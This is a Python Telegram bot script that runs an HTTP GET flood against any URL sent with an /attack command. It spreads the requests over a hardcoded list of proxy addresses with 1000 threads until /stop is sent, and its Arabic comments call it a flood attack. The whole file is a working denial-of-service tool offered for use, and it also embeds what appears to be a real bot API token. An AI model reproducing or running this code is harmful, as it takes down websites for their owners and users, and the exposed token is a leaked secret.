
import time
import requests
import threading
from concurrent.futures import ThreadPoolExecutor
import telebot

# Your Telegram bot token
API_TOKEN = '7823594166:AAG5HvvfOnliCBVKu9VsnzmCgrQb68m91go'

bot = telebot.TeleBot(API_TOKEN)

# Constants
lock = threading.Lock()
protection_active = False

def send_request(url, proxy, retries=3):
    """إرسال طلب GET باستخدام بروكسي."""
    for attempt in range(retries):
        try:
            proxies = {"http": proxy, "https": proxy}
            response = requests.get(url, timeout=5, proxies=proxies)
            return response.status_code
        except requests.RequestException:
            if attempt < retries - 1:
                time.sleep(0.0)  # تقليل زمن الانتظار بين المحاولات
    return None

def flood(url, proxies_list):
    """تنفيذ هجوم الفيضانات على URL باستخدام طلبات GET غير محدودة."""
    global protection_active
    total_sent = 0

    def task(proxy):
        send_request(url, proxy)
        with lock:
            nonlocal total_sent
            total_sent += 1
            if total_sent % 1000 == 0:
                print(f"Total requests sent: {total_sent}")

    with ThreadPoolExecutor(max_workers=1000) as executor:
        while protection_active:
            for proxy in proxies_list:
                executor.submit(task, proxy)

    print(f"Final total requests sent: {total_sent}")

# Define your proxies here with correct format
proxies_list = [
    "http://179.60.183.100:50100",
    "http://179.60.183.98:50100",
    "http://179.60.183.201:50100",
    "http://179.60.183.146:50100",
    "http://193.169.218.254:50100"
    # Add more proxies as needed
]

@bot.message_handler(commands=['attack'])
def handle_attack(message):
    global protection_active

    try:
        url = message.text.split()[1]
    except IndexError:
        bot.send_message(message.chat.id, "Usage: /attack <url>")
        return

    protection_active = True
    bot.send_message(message.chat.id, f"Starting flood for {url} with GET requests...")
    flood(url, proxies_list)

@bot.message_handler(commands=['stop'])
def handle_stop(message):
    global protection_active
    protection_active = False
    bot.send_message(message.chat.id, "Stopping flood...")

@bot.message_handler(commands=['start', 'help'])
def handle_start_help(message):
    bot.send_message(message.chat.id, "Commands:\n/attack <url>\n/stop")

bot.polling()
